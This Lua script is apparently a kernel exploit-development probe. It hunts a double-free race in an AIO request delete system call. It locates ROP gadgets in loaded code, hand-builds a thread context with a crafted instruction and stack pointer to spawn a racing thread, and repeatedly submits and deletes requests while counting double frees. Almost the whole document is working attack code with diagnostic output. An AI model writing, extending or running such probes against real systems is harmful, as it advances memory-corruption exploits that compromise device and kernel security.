-- CRASH_CLASS: HIGH
-- PROBE 943a: hunt a double successful delete while a child races the same ids
--
-- 942a's sanity check was invalid (its replacement request was zero-filled, so it
-- never completed) and every parent delete came back EBUSY because completion lags
-- the send. Here the parent polls in a loop and deletes each id as soon as its
-- state reaches 3, so every slot really is freed and re-submitted, while a child
-- thread hammers delete on the same id set.

print("=== PROBE 943a: AIO DOUBLE-DELETE HUNT ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return to_num(memory.read_dword(a)) end) if o then return v end return -999 end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function addr_of(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end

local info=memory.alloc(0x200) for i=0,0x1FC,4 do wd(info+i,0) end wd(info,0x160)
pcall(function() mk(593)(uint64(0),uint64(info)) end)
local base=rd(info+0x10C)*4294967296+rd(info+0x108)
local size=rd(info+0x110)
local function find_pat(pat)
    local off=0
    while off<size do
        local want=size-off if want>0x1000 then want=0x1000 end
        local o,s=pcall(function() return memory.read_buffer(base+off,want) end)
        if not o or type(s)~="string" then return nil end
        local i=string.find(s,pat,1,true) if i then return base+off+i-1 end
        off=off+want
    end
end
local fn=to_num(syscall.pipe.fn_addr)
local pop_rax=find_pat(string.char(0x58,0xC3))
local store_rdi=find_pat(string.char(0x48,0x89,0x07,0xC3))
print(string.format("[0] pid=%s", tostring(to_num(mk(20)()))))
if not pop_rax or not store_rdi then print("[!] gadgets missing"); return end

local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100,RDI=0x048,RSI=0x050,RDX=0x058,RAX=0x078}
local PAGE=0x4000
local function spawn(sysno,a1,a2,a3)
    local block=memory.alloc(PAGE*2)
    for i=0,PAGE*2-4,4 do wd(block+i,0) end
    local ctx=memory.alloc(0x200) for i=0,0x1FC,4 do wd(ctx+i,0) end
    wd(ctx+Ctx.MAGIC,0x480) wd(ctx+Ctx.TYPE,0x10000) wd(ctx+Ctx.CS,0x43) wd(ctx+Ctx.SS,0x3b)
    wq(ctx+Ctx.RIP,uint64(fn)) wq(ctx+Ctx.RSP,uint64(block+PAGE*2-0x200))
    wq(ctx+Ctx.RDI,uint64(a1)) wq(ctx+Ctx.RSI,uint64(a2)) wq(ctx+Ctx.RDX,uint64(a3))
    wq(ctx+Ctx.RAX,uint64(sysno))
    local ch=block+PAGE*2-0x200
    wq(ch,uint64(store_rdi)) wq(ch+8,uint64(pop_rax)) wq(ch+16,uint64(431)) wq(ch+24,uint64(fn))
    return mk(430)(uint64(ctx))
end

local N=4
local sv=memory.alloc(8) wd(sv,0) wd(sv+4,0)
mk(135)(uint64(1),uint64(1),uint64(0),uint64(sv))
local fd0,fd1=rd(sv),rd(sv+4)
print(string.format("  fds=%d,%d", fd0, fd1))
local reqs=memory.alloc(0x28*N) local ids=memory.alloc(8*N) local cids=memory.alloc(8*N)
local st=memory.alloc(8*N) local cerrs=memory.alloc(8*N) local one=memory.alloc(8)
local buf=memory.alloc(0x1000*N) local ba=addr_of(buf)
local wb=memory.alloc(0x1000*N)
for i=0,0x1000*N-4,4 do wd(wb+i,0x41424344) end
for i=0,0x28*N-1,4 do wd(reqs+i,0) end
for i=0,N-1 do
    local q=reqs+i*0x28
    wd(q+0x08,0x1000)
    wd(q+0x10,(ba+i*0x1000)%4294967296) wd(q+0x14,math.floor((ba+i*0x1000)/4294967296))
    wd(q+0x20,fd0)
end

local dbl, freed = 0, 0
for round=1,20 do
    for i=0,N-1 do wd(cerrs+i*4,0xFFFFFFFF) end
    mk(669)(uint64(0x1001),uint64(reqs),uint64(N),uint64(3),uint64(ids))
    local snap={}
    for i=0,N-1 do snap[i]=rd(ids+i*4) wd(cids+i*4,snap[i]) end
    mk(664)(uint64(ids),uint64(N),uint64(st))
    spawn(662, cids, N, cerrs)
    local sent = 0
    local okw,rw = pcall(function() return mk(133)(uint64(fd1),uint64(wb),uint64(0x1000*N),uint64(0x80),uint64(0),uint64(0)) end)
    if okw and type(rw)=="table" and rw.l then sent = rw.l else sent = to_num(rw) end
    if round==1 then print(string.format("      sent=%d of %d", sent, 0x1000*N)) end
    local done={}
    for t=1,60 do
        mk(664)(uint64(ids),uint64(N),uint64(st))
        for i=0,N-1 do
            if not done[i] and rd(st+i*4)==3 then
                local one_id=memory.alloc(8)
                wd(one_id, snap[i])
                mk(662)(uint64(one_id),uint64(1),uint64(one))
                local e=rd(one)
                if e==0 then
                    if done[i] then dbl=dbl+1 else done[i]=true freed=freed+1 end
                elseif e==0x80020003 and done[i] then
                    dbl=dbl+1   -- freed earlier, now ESRCH: expected, not a double free
                    dbl=dbl-1
                end
            end
        end
    end
    if round==1 then
        local s0,s1,s2,s3 = rd(st),rd(st+4),rd(st+8),rd(st+12)
        local c0,c1 = rd(cerrs),rd(cerrs+4)
        print(string.format("      states=%d,%d,%d,%d cerrs=0x%08X,0x%08X", s0,s1,s2,s3,c0,c1))
    end
    if round<=5 or dbl>0 then
        local cz=0
        for i=0,N-1 do if rd(cerrs+i*4)==0 then cz=cz+1 end end
        print(string.format("  [r%d] freed=%d child_zero=%d dbl=%d", round, freed, cz, dbl))
    end
    mk(240)(uint64(0),uint64(10000000))
end
print(string.format("[Z] freed_total=%d double=%d alive pid=%s", freed, dbl, tostring(to_num(mk(20)()))))
print("=== COMPLETE ===")
